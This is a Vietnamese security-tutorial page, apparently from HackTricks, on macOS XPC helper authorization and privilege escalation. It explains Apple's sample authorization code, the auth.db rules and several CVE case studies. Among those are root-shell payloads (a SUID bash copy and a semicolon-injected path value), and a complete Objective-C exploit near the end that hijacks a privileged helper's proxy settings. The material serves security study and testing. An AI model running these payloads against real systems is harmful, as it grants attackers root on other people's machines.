# Ủy quyền XPC trên macOS

{{#include ../../../../../banners/hacktricks-training.md}}

## Ủy quyền XPC

Apple cũng cung cấp một cách khác để xác thực liệu tiến trình kết nối có **quyền gọi một phương thức XPC được công khai** hay không.<sup>[[2]](#references)</sup>

Khi ứng dụng cần **thực thi hành động với quyền của người dùng có đặc quyền**, thay vì chạy ứng dụng với quyền đó, ứng dụng thường cài đặt một HelperTool dưới quyền root dưới dạng dịch vụ XPC để ứng dụng có thể gọi và yêu cầu thực hiện các hành động này. Tuy nhiên, ứng dụng gọi dịch vụ cần có đủ quyền ủy quyền.

### shouldAcceptNewConnection luôn trả về YES

Có thể tìm thấy một ví dụ trong [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). Trong `App/AppDelegate.m`, ứng dụng cố gắng **kết nối** với **HelperTool**. Còn trong `HelperTool/HelperTool.m`, hàm **`shouldAcceptNewConnection`** **không kiểm tra** bất kỳ yêu cầu nào đã nêu trước đó. Hàm này luôn trả về YES:<sup>[[1]](#references)</sup>

```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
    // Called by our XPC listener when a new connection comes in.  We configure the connection
    // with our protocol and ourselves as the main object.
{
    assert(listener == self.listener);
    #pragma unused(listener)
    assert(newConnection != nil);

    newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
    newConnection.exportedObject = self;
    [newConnection resume];

    return YES;
}
```

Để biết thêm thông tin về cách cấu hình đúng kiểm tra này:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Quyền của ứng dụng

Tuy nhiên, **việc ủy quyền sẽ diễn ra khi một phương thức của HelperTool được gọi**.

Hàm **`applicationDidFinishLaunching`** trong `App/AppDelegate.m` sẽ tạo một authorization reference trống sau khi ứng dụng khởi động. Việc này luôn phải thành công.\
Sau đó, hàm sẽ thử **thêm một số quyền** vào authorization reference đó bằng cách gọi `setupAuthorizationRights`:

```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
    [...]
    err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
    if (err == errAuthorizationSuccess) {
        err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
    }
    if (err == errAuthorizationSuccess) {
        self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
    }
    assert(err == errAuthorizationSuccess);

    // If we successfully connected to Authorization Services, add definitions for our default
    // rights (unless they're already in the database).

    if (self->_authRef) {
        [Common setupAuthorizationRights:self->_authRef];
    }

    [self.window makeKeyAndOrderFront:self];
}
```

Hàm `setupAuthorizationRights` trong `Common/Common.m` sẽ lưu các quyền của ứng dụng vào cơ sở dữ liệu auth `/var/db/auth.db`. Lưu ý rằng hàm này chỉ thêm những quyền chưa có trong cơ sở dữ liệu:

```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
    // See comment in header.
{
    assert(authRef != NULL);
    [Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
        OSStatus    blockErr;

        // First get the right.  If we get back errAuthorizationDenied that means there's
        // no current definition, so we add our default one.

        blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
        if (blockErr == errAuthorizationDenied) {
            blockErr = AuthorizationRightSet(
                authRef,                                    // authRef
                [authRightName UTF8String],                 // rightName
                (__bridge CFTypeRef) authRightDefault,      // rightDefinition
                (__bridge CFStringRef) authRightDesc,       // descriptionKey
                NULL,                                       // bundle (NULL implies main bundle)
                CFSTR("Common")                             // localeTableName
            );
            assert(blockErr == errAuthorizationSuccess);
        } else {
            // A right already exists (err == noErr) or any other error occurs, we
            // assume that it has been set up in advance by the system administrator or
            // this is the second time we've run.  Either way, there's nothing more for
            // us to do.
        }
    }];
}
```

Hàm `enumerateRightsUsingBlock` được dùng để lấy các quyền của ứng dụng, được định nghĩa trong `commandInfo`:

```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
    static dispatch_once_t sOnceToken;
    static NSDictionary *  sCommandInfo;

    dispatch_once(&sOnceToken, ^{
        sCommandInfo = @{
            NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
                kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
                kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
                kCommandKeyAuthRightDesc    : NSLocalizedString(
                    @"EBAS is trying to read its license key.",
                    @"prompt shown when user is required to authorize to read the license key"
                )
            },
            NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
                kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
                kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
                kCommandKeyAuthRightDesc    : NSLocalizedString(
                    @"EBAS is trying to write its license key.",
                    @"prompt shown when user is required to authorize to write the license key"
                )
            },
            NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
                kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
                kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
                kCommandKeyAuthRightDesc    : NSLocalizedString(
                    @"EBAS is trying to start its web service.",
                    @"prompt shown when user is required to authorize to start the web service"
                )
            }
        };
    });
    return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
    // See comment in header.
{
    return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
    // Calls the supplied block with information about each known authorization right..
{
    [self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
        #pragma unused(key)
        #pragma unused(stop)
        NSDictionary *  commandDict;
        NSString *      authRightName;
        id              authRightDefault;
        NSString *      authRightDesc;

        // If any of the following asserts fire it's likely that you've got a bug
        // in sCommandInfo.

        commandDict = (NSDictionary *) obj;
        assert([commandDict isKindOfClass:[NSDictionary class]]);

        authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
        assert([authRightName isKindOfClass:[NSString class]]);

        authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
        assert(authRightDefault != nil);

        authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
        assert([authRightDesc isKindOfClass:[NSString class]]);

        block(authRightName, authRightDefault, authRightDesc);
    }];
}
```

Điều này có nghĩa là khi quá trình này kết thúc, các quyền được khai báo bên trong `commandInfo` sẽ được lưu trong `/var/db/auth.db`. Với **mỗi method** **yêu cầu xác thực**, cơ sở dữ liệu chứa **tên quyền** và **`kCommandKeyAuthRightDefault`**. Giá trị sau cho biết **ai có thể được cấp quyền này**.<sup>[[1]](#references)</sup>

Có nhiều phạm vi khác nhau để xác định ai có thể truy cập một quyền. Một số phạm vi được định nghĩa trong [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (bạn có thể tìm [đầy đủ danh sách tại đây](https://www.dssw.co.uk/reference/authorization-rights/)), tóm tắt như sau:<sup>[[9]](#references)[[10]](#references)</sup>

<table><thead><tr><th width="284.3333333333333">Tên</th><th width="165">Giá trị</th><th>Mô tả</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Bất kỳ ai</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Không ai</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Người dùng hiện tại phải là quản trị viên (thuộc nhóm admin)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Yêu cầu người dùng xác thực.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Yêu cầu người dùng xác thực. Người dùng phải là quản trị viên (thuộc nhóm admin)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Chỉ định các quy tắc</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Chỉ định một số chú thích bổ sung về quyền</td></tr></tbody></table>

### Xác minh quyền

Trong `HelperTool/HelperTool.m`, hàm **`readLicenseKeyAuthorization`** kiểm tra xem bên gọi có được phép **thực thi method này** hay không bằng cách gọi hàm **`checkAuthorization`**. Hàm này sẽ kiểm tra xem **authData** do tiến trình gọi gửi có **định dạng chính xác** hay không, sau đó kiểm tra **những điều kiện cần thiết để được cấp quyền** gọi method cụ thể. Nếu mọi thứ đều ổn, **`error` được trả về sẽ là `nil`**:

```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
    [...]

    // First check that authData looks reasonable.

    error = nil;
    if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
        error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
    }

    // Create an authorization ref from that the external form data contained within.

    if (error == nil) {
        err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

        // Authorize the right associated with the command.

        if (err == errAuthorizationSuccess) {
            AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
            AuthorizationRights rights   = { 1, &oneRight };

            oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
            assert(oneRight.name != NULL);

            err = AuthorizationCopyRights(
                authRef,
                &rights,
                NULL,
                kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
                NULL
            );
        }
        if (err != errAuthorizationSuccess) {
            error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
        }
    }

    if (authRef != NULL) {
        junk = AuthorizationFree(authRef, 0);
        assert(junk == errAuthorizationSuccess);
    }

    return error;
}
```

Để **kiểm tra các yêu cầu nhằm có được quyền** gọi phương thức đó, `authorizationRightForCommand` kiểm tra đối tượng **`commandInfo`** đã đề cập trước đó. Sau đó, nó gọi **`AuthorizationCopyRights`** để kiểm tra **liệu caller có quyền** gọi hàm hay không (lưu ý rằng các flags cho phép tương tác với người dùng).<sup>[[1]](#references)[[3]](#references)</sup>

Trong trường hợp này, để gọi hàm `readLicenseKeyAuthorization`, `kCommandKeyAuthRightDefault` được định nghĩa là `@kAuthorizationRuleClassAllow`. Vì vậy, **bất kỳ ai cũng có thể gọi hàm này**.

### Thông tin DB

Như đã đề cập, thông tin này được lưu trong `/var/db/auth.db`. Bạn có thể liệt kê tất cả các quy tắc đã lưu bằng:

```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```

Sau đó, bạn có thể đọc ai có thể truy cập quyền này bằng:

```bash
security authorizationdb read com.apple.safaridriver.allow
```

### Quyền hạn quá rộng

Bạn có thể tìm thấy **tất cả các cấu hình quyền hạn** [**tại đây**](https://www.dssw.co.uk/reference/authorization-rights/), nhưng các tổ hợp không yêu cầu người dùng tương tác sẽ là:<sup>[[10]](#references)</sup>

1. **'authenticate-user': 'false'**
   - Đây là khóa trực tiếp nhất. Nếu được đặt thành `false`, khóa này chỉ định rằng người dùng không cần cung cấp thông tin xác thực để có được quyền này.
   - Khóa này được dùng **kết hợp với một trong 2 khóa bên dưới hoặc để chỉ định một nhóm** mà người dùng phải thuộc về.
2. **'allow-root': 'true'**
   - Nếu người dùng đang hoạt động với tư cách root (có quyền hạn nâng cao) và khóa này được đặt thành `true`, người dùng root có thể có được quyền này mà không cần xác thực thêm. Tuy nhiên, việc có được quyền root thường đã yêu cầu xác thực, nên đây không phải là trường hợp "không cần xác thực" đối với hầu hết người dùng.
3. **'session-owner': 'true'**
   - Nếu được đặt thành `true`, chủ sở hữu phiên (người dùng hiện đang đăng nhập) sẽ tự động có quyền này. Điều này có thể bỏ qua bước xác thực bổ sung nếu người dùng đã đăng nhập.
4. **'shared': 'true'**
   - Khóa này không cấp quyền khi chưa xác thực. Thay vào đó, nếu được đặt thành `true`, khóa này có nghĩa là sau khi quyền đã được xác thực, quyền đó có thể được chia sẻ giữa nhiều tiến trình mà không cần từng tiến trình xác thực lại. Tuy nhiên, việc cấp quyền ban đầu vẫn cần xác thực, trừ khi được kết hợp với các khóa khác như `'authenticate-user': 'false'`.

Bạn có thể [**dùng script này**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) để lấy các quyền đáng chú ý:

```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```

### Các nghiên cứu tình huống về bypass authorization

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: Mach service có đặc quyền `com.acustica.HelperTool` chấp nhận mọi kết nối và routine `checkAuthorization:` gọi `AuthorizationCopyRights(NULL, …)`, vì vậy mọi blob 32 byte đều được chấp nhận. Sau đó, `executeCommand:authorization:withReply:` đưa các chuỗi phân tách bằng dấu phẩy do attacker kiểm soát vào `NSTask` với quyền root, cho phép các payload như:

```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```

tạo shell root SUID một cách dễ dàng. Chi tiết trong [bài viết này](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).<sup>[[6]](#references)</sup>
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: Listener luôn trả về YES và mẫu `AuthorizationCopyRights` NULL tương tự xuất hiện trong `checkAuthorization:`. Phương thức `exchangeAppWithReply:` nối dữ liệu đầu vào do attacker kiểm soát vào chuỗi `system()` hai lần, vì vậy chèn các shell metacharacter vào `appPath` (ví dụ: `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) sẽ dẫn đến thực thi mã với quyền root thông qua Mach service `com.plugin-alliance.pa-installationhelper`. Xem thêm [tại đây](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).<sup>[[7]](#references)</sup>
- **CVE-2024-4395 – Jamf Compliance Editor helper**: Chạy một audit sẽ tạo `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, mở Mach service `com.jamf.complianceeditor.helper` và export `-executeScriptAt:arguments:then:` mà không xác minh `AuthorizationExternalForm` hoặc code signature của caller. Một exploit đơn giản tạo một reference rỗng bằng `AuthorizationCreate`, kết nối bằng `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` rồi gọi phương thức này để thực thi các binary tùy ý với quyền root. Xem ghi chú reverse engineering đầy đủ (kèm PoC) trong [bài viết của Mykola Grymalyuk](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).<sup>[[4]](#references)</sup>
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 và 7.4.0–7.4.2 chấp nhận các XPC message được tạo thủ công và chuyển đến một helper có đặc quyền nhưng thiếu các bước kiểm tra authorization. Vì helper tin cậy `AuthorizationRef` có đặc quyền của chính nó, bất kỳ local user nào có thể gửi message đến service đều có thể buộc helper thực hiện các thay đổi cấu hình hoặc lệnh tùy ý với quyền root. Xem chi tiết trong [bản tóm tắt tư vấn bảo mật của SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).<sup>[[5]](#references)</sup>

#### Mẹo phân loại nhanh

- Khi một app đi kèm cả GUI lẫn helper, hãy diff code requirement của chúng và kiểm tra xem `shouldAcceptNewConnection` có khóa listener bằng `-setCodeSigningRequirement:` (hoặc xác thực `SecCodeCopySigningInformation`) hay không. Thiếu các bước kiểm tra này thường dẫn đến các tình huống CWE-863 như trường hợp Jamf. Có thể xem nhanh như sau:

```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```

- So sánh điều mà helper *nghĩ* nó đang cấp quyền với điều client cung cấp. Khi reverse, hãy đặt breakpoint tại `AuthorizationCopyRights` và xác nhận `AuthorizationRef` bắt nguồn từ `AuthorizationCreateFromExternalForm` (do client cung cấp), chứ không phải từ context có đặc quyền của chính helper; nếu không, nhiều khả năng bạn đã tìm thấy một mẫu CWE-863 tương tự các trường hợp ở trên.

## Reverse Authorization

### Kiểm tra xem có sử dụng EvenBetterAuthorization hay không

Nếu tìm thấy hàm: **`[HelperTool checkAuthorization:command:]`**, có lẽ process đang sử dụng schema authorization đã đề cập trước đó:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Nếu hàm này gọi các API như `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights` và `AuthorizationFree`, thì nó đang sử dụng mẫu [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Kiểm tra **`/var/db/auth.db`** để xem có thể lấy quyền gọi một số hành động đặc quyền mà không cần tương tác với người dùng hay không.

### Giao tiếp qua Protocol

Tiếp theo, bạn cần tìm schema của protocol để có thể thiết lập giao tiếp với dịch vụ XPC.

Hàm **`shouldAcceptNewConnection`** cho biết protocol được export:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

Trong trường hợp này, chúng ta có nội dung giống như trong EvenBetterAuthorizationSample, [**xem dòng này**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Khi biết tên protocol được sử dụng, có thể **dump định nghĩa header** bằng lệnh:

```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```

Cuối cùng, chúng ta chỉ cần biết **tên của Mach Service được expose** để thiết lập giao tiếp với nó. Có một số cách để tìm thông tin này:

- Trong **`[HelperTool init]`**, nơi bạn có thể thấy Mach Service đang được sử dụng:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- Trong launchd plist:

```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

	<key>MachServices</key>
	<dict>
		<key>com.example.HelperTool</key>
		<true/>
	</dict>
[...]
```

### Ví dụ khai thác

Trong ví dụ này, các thành phần sau được tạo:

- Định nghĩa protocol với các hàm
- Một auth trống để yêu cầu quyền truy cập
- Kết nối đến dịch vụ XPC
- Gọi hàm nếu kết nối thành công

```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
    NSData *authData;
    OSStatus status;
    AuthorizationExternalForm authForm;
    AuthorizationRef authReference = {0};
    NSString *proxyAddress = @"127.0.0.1";
    NSString *proxyPort = @"4444";
    Boolean isProxyEnabled = true;

    // Create an empty authorization reference
    status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
    const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
    NSLog(@"OSStatus: %s", errorMsg);

    // Convert the authorization reference to an external form
    if (status == errAuthorizationSuccess) {
        status = AuthorizationMakeExternalForm(authReference, &authForm);
        errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
        NSLog(@"OSStatus: %s", errorMsg);
    }

    // Convert the external form to NSData for transmission
    if (status == errAuthorizationSuccess) {
        authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
        errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
        NSLog(@"OSStatus: %s", errorMsg);
    }

    // Ensure the authorization was successful
    assert(status == errAuthorizationSuccess);

    // Establish an XPC connection
    NSString *serviceName = XPCServiceName;
    NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
    NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
    [xpcConnection setRemoteObjectInterface:xpcInterface];
    [xpcConnection resume];

    // Handle errors for the XPC connection
    id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
        NSLog(@"[-] Connection error");
        NSLog(@"[-] Error: %@", error);
    }];

    // Log the remote proxy and connection objects
    NSLog(@"Remote Proxy: %@", remoteProxy);
    NSLog(@"XPC Connection: %@", xpcConnection);

    // Use the legacy method to configure the proxy
    [remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
        NSLog(@"Response: %@", error);
    }];

    // Allow some time for the operation to complete
    [NSThread sleepForTimeInterval:10.0f];

    NSLog(@"Finished!");
}
```

## Các helper XPC khác dùng để leo thang đặc quyền

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[[8]](#references)</sup>

## References

- [1] [Apple Developer — Mẫu EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([mirror on GitHub](https://github.com/brenwell/EvenBetterAuthorizationSample))
- [2] [Apple Developer — Dịch vụ Authorization](https://developer.apple.com/documentation/security/authorization-services)
- [3] [Apple Developer — `AuthorizationCopyRights`](https://developer.apple.com/documentation/security/authorizationcopyrights(_:_:_:_:_:))
- [4] [CVE-2024-4395: Leo thang đặc quyền trong Jamf Compliance Editor](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [5] [CVE-2025-25251: Lỗ hổng leo thang đặc quyền trong FortiClient Mac](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [6] [CVE-2025-65842 – Leo thang đặc quyền cục bộ qua dịch vụ XPC HelperTool của Acustica Audio trong Aquarius Desktop trên macOS](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [7] [CVE-2025-55076 – Leo thang đặc quyền cục bộ qua dịch vụ XPC InstallationHelper của Plugin Alliance](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
- [8] [CVE-2019-8805: Leo thang đặc quyền trong framework EndpointSecurity của Apple (SecureLayer7)](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)
- [9] [Mã nguồn mở Apple — AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h)
- [10] [Tài liệu tham khảo về quyền Authorization (dssw.co.uk)](https://www.dssw.co.uk/reference/authorization-rights/)
{{#include ../../../../../banners/hacktricks-training.md}}
